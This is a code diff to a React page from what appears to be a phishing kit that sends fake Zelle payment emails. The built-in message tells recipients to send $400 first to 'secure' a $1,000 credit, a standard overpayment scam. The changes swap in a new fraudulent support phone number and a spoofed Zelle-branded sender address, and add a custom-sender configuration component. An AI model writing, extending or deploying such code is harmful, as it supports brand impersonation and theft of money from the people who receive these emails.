@@ -3,6 +3,7 @@
 import { useState } from "react";
 import { sendEmail } from "../../actions";
 import { ZelleAdditionalPaymentTemplate } from "@/components/ZelleAdditionalPaymentTemplate";
+import { SenderConfiguration } from "@/components/SenderConfiguration";
 import { ZelleAdditionalPaymentContent } from "@/types/email";
 
 const defaultVisibleBlocks = {
@@ -57,9 +58,9 @@ export default function ZelleAdditionalPage() {
     instructionsTitle: 'FINAL STEPS & INSTRUCTIONS TO FOLLOW',
     message: `For your account to be credited fully with the sum of $1,000.00 You are required to send the sum of $400.00 (FIRST) to the buyer's Zelle information for your buyer's safety, so as to secure the additional payment the buyer sent to expand your account and also we "Congratulate" you for successfully upgrading your account to Business User which gives you unlimited access to all business features on your regular account.`,
     supportText: "For Assistance, contact the support number below:",
-    supportNumber: "+1 (586) 347-1749",
+    supportNumber: "+1 (336) 310-9279",
     toEmail: "",
-    fromEmail: "no-replyzellecustomersupport@milanosailexpress.com",
+    fromEmail: "zelle@customersupportagent.support",
     additionalAmount: "400.00",
     totalAmount: "1,000.00",
     finalAmount: "2,000.00",
@@ -80,7 +81,7 @@ Once the refund is complete, $1,000.00 will reflect in your account immediately.
 
     try {
       const result = await sendEmail(emailContent.toEmail, emailContent);
-      
+
       if (result.success) {
         setStatus("success");
         setEmailContent(prev => ({ ...prev, toEmail: "" }));
@@ -141,8 +142,8 @@ Once the refund is complete, $1,000.00 will reflect in your account immediately.
                 </button>
               )}
             </div>
-            <ZelleAdditionalPaymentTemplate 
-              content={emailContent} 
+            <ZelleAdditionalPaymentTemplate
+              content={emailContent}
               onToggleBlock={handleToggleBlock}
               onUpdateContent={handleUpdateContent}
             />
@@ -206,18 +207,26 @@ Once the refund is complete, $1,000.00 will reflect in your account immediately.
                   </div>
                   <div>
                     <label className="block text-sm font-medium mb-1 text-gray-700 dark:text-gray-300">
-                      From Email
+                      From Email (Legacy - Use Sender Configuration Below)
                     </label>
                     <input
                       type="email"
                       value={emailContent.fromEmail}
                       onChange={(e) => handleUpdateContent({ fromEmail: e.target.value })}
+                      placeholder="customersupportzellemgt@customersupportagent.support"
                       className="w-full p-2 border dark:border-gray-600 rounded bg-white dark:bg-gray-700 text-gray-900 dark:text-gray-100"
                       required
                     />
                   </div>
                 </div>
               </BlockConfig>
+
+              {/* Sender Configuration */}
+              <SenderConfiguration
+                service="zelle"
+                currentSender={emailContent.customSender}
+                onSenderChange={(sender) => handleUpdateContent({ customSender: sender })}
+              />
 
               {/* Amount Notification Block */}
               <BlockConfig
@@ -400,4 +409,4 @@ Once the refund is complete, $${emailContent.totalAmount} will reflect in your a
       </div>
     </div>
   );
-} 
+}
